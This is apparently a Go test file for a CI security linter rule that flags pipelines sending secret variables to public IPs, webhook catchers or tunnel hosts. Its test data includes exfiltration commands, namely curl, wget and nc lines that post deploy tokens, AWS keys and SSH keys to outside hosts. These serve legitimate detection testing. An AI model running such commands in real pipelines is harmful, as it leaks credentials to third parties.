// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
)

func findings097(t *testing.T, yaml string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(yaml), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return GL097.Check(doc.Root, "test.yml")
}

// script097 puts line in a single-quoted YAML scalar, so a colon in a
// user:pass or host:port does not make YAML read the script line as a mapping.
func script097(line string) string {
	return "j:\n  script:\n    - '" + strings.ReplaceAll(line, "'", "''") + "'\n"
}

// A secret-like variable sent to a public raw IP, a webhook catcher or a tunnel
// host via curl/wget/nc is exfiltration: error, naming the destination.
func TestGL097_ExfilToUntrustedDestIsError(t *testing.T) {
	cases := map[string]string{ //nolint:gosec // G101: example shell command strings, not credentials
		`curl --data "token=$DEPLOY_TOKEN" https://203.0.113.5/collect`:         "203.0.113.5",
		`wget --post-data="key=$AWS_SECRET_ACCESS_KEY" https://webhook.site/ab`: "webhook.site",
		`curl -X POST -d "p=$CI_JOB_TOKEN" https://x.ngrok.io/h`:                "x.ngrok.io",
		`curl --data "t=$MY_SECRET" https://198.51.100.9/`:                      "198.51.100.9",
		`echo "$API_TOKEN" | nc 198.51.100.7 4444`:                              "198.51.100.7",
		`curl --url=https://203.0.113.8/i -d "s=$SSH_KEY"`:                      "203.0.113.8",
	}
	for line, dest := range cases {
		fs := findings097(t, script097(line))
		if len(fs) != 1 {
			t.Errorf("%q: got %d findings, want 1", line, len(fs))
			continue
		}
		if fs[0].Severity != finding.Error {
			t.Errorf("%q: severity %v, want error", line, fs[0].Severity)
		}
		if !strings.Contains(fs[0].Message, dest) {
			t.Errorf("%q: message does not name destination %q: %s", line, dest, fs[0].Message)
		}
		if fs[0].RuleID != "GL097" {
			t.Errorf("%q: rule %s, want GL097", line, fs[0].RuleID)
		}
	}
}

// Publishing to a named service or a private/internal address, an egress with
// no secret, a non-secret variable, and a secret paired across ;/&&/|| are all
// not exfiltration: no finding.
func TestGL097_NoFindingOnBenign(t *testing.T) {
	for _, line := range []string{
		// Named service domain the project could own — publishing.
		`curl --data "token=$DEPLOY_TOKEN" https://registry.example.com/upload`,
		// Private / internal registry by RFC1918 IP.
		`curl -u "ci:$REGISTRY_PASSWORD" http://10.0.0.5/v2/`,
		// Loopback.
		`curl https://127.0.0.1/ -d "t=$API_TOKEN"`,
		// Link-local (IMDS) is not a publish target, but also not public-routable.
		`curl http://169.254.169.254/latest/ -d "t=$API_TOKEN"`,
		// CGNAT.
		`curl --data "t=$API_TOKEN" https://100.64.0.1/`,
		// Public IP but no secret-like variable in the pipeline.
		`curl --data "payload=ok" https://203.0.113.5/`,
		// A non-secret variable to a public IP.
		`curl --data "v=$CACHE_VERSION" https://203.0.113.5/`,
		// Secret and egress in different commands (`;`), not one pipeline.
		`echo "$API_TOKEN" ; curl https://203.0.113.5/`,
	} {
		if fs := findings097(t, script097(line)); len(fs) != 0 {
			t.Errorf("%q: got %d findings, want 0: %+v", line, len(fs), fs)
		}
	}
}

// The rule reads every script surface, not just script:.
func TestGL097_AllScriptSurfaces(t *testing.T) {
	yaml := "deploy:\n" +
		"  before_script:\n" +
		"    - 'curl --data \"t=$DEPLOY_TOKEN\" https://203.0.113.5/i'\n" +
		"  script:\n" +
		"    - make build\n"
	if fs := findings097(t, yaml); len(fs) != 1 {
		t.Errorf("before_script: got %d findings, want 1", len(fs))
	}
}
